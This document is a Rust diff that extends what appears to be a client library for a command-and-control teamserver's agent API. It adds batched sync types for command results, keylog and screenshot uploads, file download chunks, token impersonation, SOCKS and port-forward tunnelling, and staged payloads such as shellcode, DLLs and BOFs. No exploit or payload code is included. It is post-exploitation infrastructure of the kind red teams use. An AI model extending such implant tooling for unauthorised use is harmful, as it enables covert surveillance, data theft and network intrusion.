@@ -30,6 +30,7 @@
 use base64::{engine::general_purpose::STANDARD as B64, Engine};
 use serde::{Deserialize, Serialize};
 use serde_json::{json, Value};
+use std::collections::HashMap;
 use std::time::Duration;
 use thiserror::Error;
 
@@ -124,20 +125,20 @@ impl HexioClient {
         Ok(serde_json::from_value(self.request("GET", "/agent/checkin", None)?)?)
     }
 
-    pub fn sync(&self, sleep_time: Option<i64>, sleep_jitter: Option<i64>) -> Result<Value> {
-        let body = if let Some(st) = sleep_time {
-            let mut sleep = serde_json::Map::new();
-            sleep.insert("sleep_time".into(), json!(st));
-            if let Some(j) = sleep_jitter {
-                sleep.insert("sleep_jitter".into(), json!(j));
-            }
-            Some(json!({ "sleep": sleep }))
-        } else {
-            None
+    /// Full batched POST /agent/sync. If `req` is `None`, POSTs an empty body and the
+    /// endpoint behaves identically to `/agent/checkin` (returns queued commands and
+    /// any staged files).
+    pub fn sync(&mut self, req: Option<&SyncRequest>) -> Result<SyncResponse> {
+        let body = match req {
+            Some(r) => Some(serde_json::to_value(r)?),
+            None => None,
         };
-        self.request("POST", "/agent/sync", body.as_ref())
+        let raw = self.request("POST", "/agent/sync", body.as_ref())?;
+        Ok(serde_json::from_value(raw)?)
     }
 
+    /// Lower-level escape hatch. POSTs an arbitrary JSON payload to /agent/sync and
+    /// returns the raw JSON response.
     pub fn sync_raw(&self, body: &Value) -> Result<Value> {
         self.request("POST", "/agent/sync", Some(body))
     }
@@ -275,7 +276,7 @@ pub struct RegisterResponse {
     pub token: String,
 }
 
-#[derive(Debug, Clone, Deserialize)]
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct Command {
     pub id: i64,
     pub command: String,
@@ -289,7 +290,7 @@ pub struct CheckinResponse {
     pub files: Vec<Value>,
 }
 
-#[derive(Debug, Clone, Serialize)]
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct DownloadInitRequest {
     pub file_name: String,
     pub agent_path: String,
@@ -298,7 +299,7 @@ pub struct DownloadInitRequest {
     pub total_chunks: i64,
 }
 
-#[derive(Debug, Clone, Deserialize)]
+#[derive(Debug, Clone, Serialize, Deserialize, Default)]
 pub struct DownloadInitResponse {
     pub download_id: String,
     pub agent_path: String,
@@ -320,4 +321,311 @@ pub struct FileRequest {
     pub shellcode_files: Option<Vec<String>>,
     #[serde(skip_serializing_if = "Option::is_none")]
     pub hexlang: Option<Vec<String>>,
+}
+
+// --- Sync batch types ---
+
+/// Update the agent's sleep interval and optional jitter.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SleepUpdate {
+    pub sleep_time: i64,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub sleep_jitter: Option<i64>,
+}
+
+/// Result of a command execution being reported back to the teamserver.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct CommandResult {
+    pub command_id: i64,
+    pub command: String,
+    pub response: String,
+}
+
+/// Side-channel payload from the agent. `data` is base64-encoded.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SideChannelResponse {
+    pub channel_id: String,
+    pub data: String,
+}
+
+/// A single file chunk upload. `chunk_data` is base64-encoded.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct DownloadChunkUpload {
+    pub download_id: String,
+    pub chunk_data: String,
+}
+
+/// Screenshot upload. `data` is base64-encoded image bytes.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct ScreenshotUpload {
+    pub filename: String,
+    pub data: String,
+}
+
+/// Keylog upload. `data` is raw keystroke text.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct KeylogUpload {
+    pub filename: String,
+    pub data: String,
+}
+
+/// Inbound SOCKS data from the agent: `{ id, data }`. `data` is base64.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SocksReceive {
+    pub id: String,
+    pub data: String,
+}
+
+/// Request half of `socks_sync`: sockids the agent closed and bytes it received
+/// from the remote.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SocksSyncRequest {
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub closes: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub receives: Vec<SocksReceive>,
+}
+
+/// A new SOCKS connection opened on the teamserver side that the agent must
+/// dial out to.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SocksOpenEntry {
+    pub id: String,
+    pub addr: String,
+    pub port: i64,
+    pub proto: String,
+}
+
+/// Outbound SOCKS payload to the agent. Note: the wire field in the response
+/// is `send` (singular), not `sends`.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SocksSend {
+    pub id: String,
+    pub data: String,
+    pub size: i64,
+}
+
+/// Response half of `socks_sync`: new socket opens, closed sockids, and bytes
+/// destined for the agent.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SocksSyncResponse {
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub opens: Vec<SocksOpenEntry>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub closes: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub send: Vec<SocksSend>,
+}
+
+/// Request to open a new teamserver-side port forward listener.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdOpenRequest {
+    pub port: i64,
+    pub remote_host: String,
+    pub remote_port: i64,
+}
+
+/// Outbound port-forward data from the agent: bytes it read from the remote
+/// and wants to hand back to the teamserver. Note wire field is `sockid`.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdSend {
+    #[serde(rename = "sockid")]
+    pub sock_id: String,
+    pub data: String,
+    pub size: i64,
+}
+
+/// Per-port payload the agent sends in a `portfwd_sync` request entry.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdInboundData {
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub opens: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub sends: Vec<PortFwdSend>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub closes: Vec<String>,
+}
+
+/// Single entry in the `portfwd_sync` request array.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdSyncRequestEntry {
+    pub port: i64,
+    pub data: PortFwdInboundData,
+}
+
+/// Bytes the teamserver received on a forwarded port that the agent should
+/// push into the corresponding remote socket.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdRecv {
+    #[serde(rename = "sockid")]
+    pub sock_id: String,
+    pub data: String,
+    pub size: i64,
+}
+
+/// Per-port payload the teamserver returns in a `portfwd_sync` response entry.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdOutboundData {
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub recvs: Vec<PortFwdRecv>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub closes: Vec<String>,
+}
+
+/// Single entry in the `portfwd_sync` response array.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdSyncResponseEntry {
+    pub port: i64,
+    pub data: PortFwdOutboundData,
+}
+
+/// Unit type that always serializes to the empty JSON object `{}`. Used for
+/// presence-triggered flags like `socks_open` / `socks_close` in `SyncRequest`.
+#[derive(Debug, Clone, Copy, Default)]
+pub struct Empty;
+
+impl Serialize for Empty {
+    fn serialize<S: serde::Serializer>(&self, serializer: S) -> std::result::Result<S::Ok, S::Error> {
+        use serde::ser::SerializeMap;
+        let map = serializer.serialize_map(Some(0))?;
+        map.end()
+    }
+}
+
+impl<'de> Deserialize<'de> for Empty {
+    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> std::result::Result<Self, D::Error> {
+        let _ = serde_json::Value::deserialize(deserializer)?;
+        Ok(Empty)
+    }
+}
+
+/// Full batched payload for `POST /agent/sync`. Every field is optional; only
+/// set what you need. For `socks_open` / `socks_close`, use
+/// [`SyncRequest::trigger_socks_open`] / [`SyncRequest::trigger_socks_close`]
+/// (the server reads presence-of-key, so they serialize as `{}`).
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SyncRequest {
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub sleep: Option<SleepUpdate>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub impersonation: Option<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub commands: Vec<CommandResult>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub side_channel_responses: Vec<SideChannelResponse>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub download_init: Vec<DownloadInitRequest>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub download_chunk: Vec<DownloadChunkUpload>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub download_cancel: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub screenshots: Vec<ScreenshotUpload>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub keylog: Option<KeylogUpload>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub bof_files: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub pe_files: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub dll_files: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub elf_files: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub macho_files: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub shellcode_files: Vec<String>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub hexlang: Vec<String>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub socks_open: Option<Empty>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub socks_open_port: Option<i64>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub socks_close: Option<Empty>,
+    #[serde(skip_serializing_if = "Option::is_none", default)]
+    pub socks_sync: Option<SocksSyncRequest>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub portfwd_open: Vec<PortFwdOpenRequest>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub portfwd_close: Vec<i64>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub portfwd_sync: Vec<PortFwdSyncRequestEntry>,
+}
+
+impl SyncRequest {
+    /// Set the `socks_open` presence key so the teamserver opens the SOCKS proxy.
+    pub fn trigger_socks_open(&mut self) {
+        self.socks_open = Some(Empty);
+    }
+
+    /// Set the `socks_close` presence key so the teamserver closes the SOCKS proxy.
+    pub fn trigger_socks_close(&mut self) {
+        self.socks_close = Some(Empty);
+    }
+}
+
+/// Acknowledgement of a single uploaded chunk.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct DownloadChunkAck {
+    pub download_id: String,
+    pub chunk_received: bool,
+}
+
+/// Result of a `portfwd_open` / `portfwd_close` operation.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct PortFwdOpCloseResult {
+    pub port: i64,
+    pub success: bool,
+}
+
+/// File staged on the teamserver that the agent should pick up.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct StagedFile {
+    pub filename: String,
+    pub filetype: String,
+    pub alias: String,
+    pub filedata: String,
+}
+
+/// Full response from `POST /agent/sync`. Only fields relevant to the request
+/// are populated.
+#[derive(Debug, Clone, Default, Serialize, Deserialize)]
+pub struct SyncResponse {
+    #[serde(default)]
+    pub commands: Vec<Command>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub files: Vec<StagedFile>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub download_init: Vec<DownloadInitResponse>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub download_chunk: Vec<DownloadChunkAck>,
+    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
+    pub bof_files: HashMap<String, String>,
+    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
+    pub pe_files: HashMap<String, String>,
+    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
+    pub dll_files: HashMap<String, String>,
+    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
+    pub elf_files: HashMap<String, String>,
+    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
+    pub macho_files: HashMap<String, String>,
+    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
+    pub shellcode_files: HashMap<String, String>,
+    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
+    pub hexlang: HashMap<String, String>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub socks_open: Option<bool>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub socks_port: Option<i64>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub socks_close: Option<bool>,
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub socks_sync: Option<SocksSyncResponse>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub portfwd_open: Vec<PortFwdOpCloseResult>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub portfwd_close: Vec<PortFwdOpCloseResult>,
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub portfwd_sync: Vec<PortFwdSyncResponseEntry>,
 }
